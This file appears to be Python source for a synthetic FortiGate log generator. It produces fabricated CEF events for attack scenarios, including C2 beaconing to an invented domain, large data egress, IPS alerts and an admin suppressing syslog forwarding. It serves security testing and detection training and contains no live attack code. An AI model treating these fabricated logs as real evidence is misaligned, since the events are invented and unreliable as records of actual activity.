# Scenario handler

def _generate_scenario_log(config, scenario):
    """Generates a specific CEF log for an orchestrator scenario."""
    user, shost  = _get_user_and_host_info(config, scenario.get("source_ip"))
    src_ip       = scenario.get("source_ip", "192.168.1.100")
    dst_ip       = scenario.get("dest_ip", _random_external_ip())
    dpt          = scenario.get("dest_port", 443)
    act          = scenario.get("action", "accept")
    domain       = scenario.get("dest_domain", dst_ip)
    log_type     = scenario.get("log_type", "traffic")

    fields = _base_traffic_fields(config, src_ip, shost, user, dst_ip, domain, "6", dpt, act)

    if log_type == "ips":
        fields.update({
            "FTNTFGTattack":    scenario.get("threat_name", "Scenario.Threat"),
            "FTNTFGTattackid":  str(random.randint(90000000, 99999999)),
            "FTNTFGTseverity":  "high",
            "FTNTFGTCRlevel":   "high",
            "msg":              f"Scenario IPS event: {scenario.get('threat_name', 'Scenario.Threat')}",
        })
        return _format_fortinet_cef(config, "0419016384", "utm", "ips", "alert", fields)
    elif log_type == "webfilter":
        fields.update({
            "hostname": domain,
            "cat":      str(random.choice(_URL_CAT_BLOCKED)),
            "msg":      f"Scenario webfilter event for {domain}",
        })
        return _format_fortinet_cef(config, "0201008192", "utm", "webfilter", "warning", fields)
    elif log_type == "large_egress":
        fields["out"] = random.randint(100 * 1024 * 1024, 500 * 1024 * 1024)
        fields["msg"] = f"Scenario large egress to {domain}"
        return _format_fortinet_cef(config, "0000000013", "traffic", "forward", "warning", fields)
    else:  # traffic
        return _format_fortinet_cef(config, "0000000013", "traffic", "forward", "notice", fields)


# Main entry point

def generate_log(config, scenario=None, threat_level="Realistic", benign_only=False, context=None, scenario_event=None):
    """
    Main log generation function for Fortinet FortiGate.

    Returns a single log string OR a list of log strings (for multi-event scenarios).
    """
    global last_threat_event_time
    session_context = (context or {}).get("session_context")

    # Orchestrator scenario override
    if scenario:
        scenario_event = scenario if isinstance(scenario, str) else scenario.get("name", "")
        if scenario_event == "LARGE_EGRESS":
            _sctx = scenario if isinstance(scenario, dict) else {}
            return _simulate_large_upload(
                config,
                _sctx.get("src_ip") or random.choice(config.get("internal_servers", ["192.168.1.100"])),
                "svc_account", None,
                domain=_sctx.get("domain"), dst_ip=_sctx.get("dst_ip")
            )
        return _generate_scenario_log(config, scenario if isinstance(scenario, dict) else {})

    if scenario_event:
        ctx = context or {}
        if scenario_event == "C2_EGRESS":
            # Workstation → external C2 egress carrying the pinned box identity
            # (suser/shost/src), so it stitches to the endpoint case.

            user  = ctx.get('user')
            src_ip = ctx.get('src_ip')
            shost = ctx.get('hostname')
            if not (user and src_ip):
                ui = get_random_user(session_context, preferred_device_type="workstation") if session_context else None
                if ui:
                    user, src_ip, shost = user or ui['username'], src_ip or ui['ip'], shost or ui['hostname']
                else:
                    src_ip = src_ip or rand_ip_from_network(ip_network(random.choice(config.get('internal_networks', ['192.168.1.0/24']))))
            user = user or 'unknown'
            domain = ctx.get('domain') or f"sync-{random.randint(100,999)}.telemetry-cdn.net"
            dst_ip = ctx.get('dst_ip') or _random_external_ip()
            port   = int(ctx.get('port', 443))
            logs = []
            for _ in range(random.randint(10, 16)):     # beacon cadence
                fields = _base_traffic_fields(config, src_ip, shost, user, dst_ip, domain,
                                              "6", port, "accept", duration_s=random.randint(1, 30))
                fields.update({
                    "_no_user_qualify": True,   # keep the exact box user (bare) for the stitch
                    "app": "HTTPS",
                    "request": "/api/v1/checkin", "FTNTFGThttpmethod": "GET", "FTNTFGThttpcode": "200",
                    "requestClientApplication": random.choice(["python-requests/2.31.0", "Go-http-client/1.1", "curl/8.4.0"]),
                    "FTNTFGTapp": "HTTPS.BROWSER", "FTNTFGTappcat": "Web.Client",
                    "out": random.randint(200, 900), "in": random.randint(120, 400),
                    "msg": f"Recurring outbound to uncommon domain {domain}",
                })
                logs.append(_format_fortinet_cef(config, "0000000013", "traffic", "forward", "notice", fields))
            return logs
        # Named threat from dashboard — dispatch to the specific event
        _MGMT_BACKDATE["on"] = bool(ctx.get("mgmt_backdate"))
        try:
            if scenario_event in ("recurring_rare_domain", "RECURRING_RARE_DOMAIN"):
                src_ip = ctx.get("src_ip") or random.choice(config.get("internal_servers", ["192.168.1.100"]))
                user = ctx.get("user") or "unknown"
                shost = ctx.get("hostname")
                return (_simulate_recurring_rare_domain(
                    config, src_ip, user, shost,
                    domain=ctx.get("domain"), dst_ip=ctx.get("dst_ip")), scenario_event)
            return _generate_threat_log(config, session_context, forced_event=scenario_event,
                                        attacker_ip=ctx.get("src_ip"))
        finally:
            _MGMT_BACKDATE["on"] = False

    # Logging suppressed: silent until the window closes, then the same admin turns
    # syslog forwarding back on and logs out (_simulate_mgmt_logging_suppressed).
    _sup = mgmt_plane.suppression_state(_FGT_SUPPRESS_KEY)
    if _sup == "active":
        return None
    if _sup:
        now = time.time()
        forti_conf = _get_config(config)
        return [_fgt_logging_toggle(config, _sup["user"], _sup["src"], now, enable=True),
                _fgt_mgmt_event(config, "0100032003", "information", now + 3, {
                    "duser": _sup["user"], "src": _sup["src"],
                    "dst": forti_conf.get("management_ip", "172.16.200.1"),
                    "FTNTFGTui": f"ssh({_sup['src']})", "act": "logout", "outcome": "success",
                    "FTNTFGTlogdesc": "Admin logout successful",
                    "FTNTFGTduration": int(now - _sup["since"]),
                    "msg": f"Administrator {_sup['user']} logged out from ssh({_sup['src']})"})]
    if mgmt_plane.backup_due(_FGT_SUPPRESS_KEY):
        return _simulate_mgmt_config_backup(config, session_context)

    if benign_only:
        return _generate_benign_log(config, session_context)

    interval     = _get_threat_interval(threat_level, config)
    current_time = time.time()

    if threat_level == "Insane" and random.random() < 0.8:
        return _generate_threat_log(config, session_context)

    if interval > 0 and (current_time - last_threat_event_time) > interval:
        last_threat_event_time = current_time
        return _generate_threat_log(config, session_context)

    return _generate_benign_log(config, session_context)
